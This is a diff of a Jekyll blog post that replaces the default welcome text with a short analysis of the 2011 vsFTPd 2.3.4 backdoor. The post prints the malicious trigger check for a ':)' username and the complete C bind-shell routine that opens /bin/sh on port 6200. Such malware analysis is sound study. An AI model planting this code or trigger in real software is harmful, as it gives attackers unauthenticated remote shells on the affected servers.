@@ -4,26 +4,45 @@ title:  "Mon premier article"
 date:   2021-03-24 10:02:20 +0100
 categories: jekyll update
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
+# vsFTPd Backdoor
 
-Jekyll requires blog post files to be named according to the following format:
+## What is vsFTPd ?
 
-`YEAR-MONTH-DAY-title.MARKUP`
-
-Where `YEAR` is a four-digit number, `MONTH` and `DAY` are both two-digit numbers, and `MARKUP` is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.
-
-Jekyll also offers powerful support for code snippets:
-
-{% highlight ruby %}
-def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=> prints 'Hi, Tom' to STDOUT.
-{% endhighlight %}
-
-Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
-
-[jekyll-docs]: https://jekyllrb.com/docs/home
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-talk]: https://talk.jekyllrb.com/
+**vsftpd**, (or **very secure FTP daemon**) is an FTP server for Unix-like systems.
+In July 2011, it was discovered that vsftpd version 2.3.4 downloadable from the master site had been compromised. Users logging into a compromised vsftpd-2.3.4 server may issue a ":)" smileyface as the username and gain a command shell on port 6200. This was not an issue of a security hole in vsftpd, instead, an unknown attacker had uploaded a different version of vsftpd which contained a backdoor. ([Wikipedia](https://en.wikipedia.org/wiki/Vsftpd))
+## So how does the backdoor work ?
+Wikipedia told us that you need to inject ***:)*** as username to get a shell. So after searching ***0x3a***, "***:***" in hex, we find the following code. 
+```c
+else if((p_str->p_buf[i]==0x3a)
+    && (p_str->p_buf[i+1]==0x29))
+    {
+      vsf_sysutil_extra();
+    }
+```
+So if the username is  ***:)***, it execute the ***vsf_sysutil_extra*** function. 
+## vsf_sysutil_extra
+After searching for vsf_sysutil_extra, I found this :
+```c
+vsf_sysutil_extra(void)
+{
+  int fd, rfd;
+  struct sockaddr_in sa;
+  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+  exit(1);
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(6200);
+  sa.sin_addr.s_addr = INADDR_ANY;
+  if((bind(fd,(struct sockaddr *)&sa,
+  sizeof(struct sockaddr))) < 0) exit(1);
+  if((listen(fd, 100)) == -1) exit(1);
+  for(;;)
+  {
+    rfd = accept(fd, 0, 0);
+    close(0); close(1); close(2);
+    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
+    execl("/bin/sh","sh",(char *)0);
+  }
+}
+```
+This looks like a bind shell code. Bind shells have the listener running on the target and the attacker connect to the listener in order to gain a remote shell. ***sa.sin_port=6200*** serves as the **backdoor** port and all the commands sent to the service get executed using the ***execl("/bin/sh","sh",(char \*)0);*** function.
